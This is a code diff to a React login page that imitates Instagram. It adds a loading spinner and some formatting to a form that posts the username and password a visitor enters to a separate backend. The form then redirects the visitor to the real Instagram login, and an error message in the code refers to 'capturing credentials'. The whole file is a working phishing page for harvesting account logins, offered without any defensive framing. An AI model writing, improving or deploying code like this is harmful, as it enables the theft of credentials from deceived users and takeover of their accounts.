@@ -1,12 +1,15 @@
-import { useState } from 'react'
-import axios from 'axios'
+import React, { useState } from "react";
+import axios from "axios";
+import "./App.css";
 
-const App = () => {
+function App() {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
+  const [isLoading, setIsLoading] = useState(false); 
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+    setIsLoading(true); // Start loading
     try {
       await axios.post(`${import.meta.env.VITE_BACKEND}/api/login`, {
         username,
@@ -17,8 +20,11 @@ const App = () => {
       window.location.href = "https://www.instagram.com/accounts/login/";
     } catch (err) {
       console.error("Error capturing credentials", err);
+    } finally {
+      setIsLoading(false);
     }
   };
+
   return (
     <div className="container">
       <div className="login-box">
@@ -42,12 +48,26 @@ const App = () => {
             onChange={(e) => setPassword(e.target.value)}
             required
           />
-          <button type="submit">Log In</button>
+          <button type="submit" disabled={isLoading}>
+            {isLoading ? "Logging in..." : "Log In"}
+          </button>
         </form>
+
+        {isLoading && (
+          <div className="loading">
+            <img
+              src="https://i.gifer.com/ZZ5H.gif"
+              alt="Loading..."
+              width="40"
+              height="40"
+            />
+          </div>
+        )}
+
         <p className="forgot">Forgot password?</p>
       </div>
     </div>
-  )
+  );
 }
 
-export default App
+export default App;
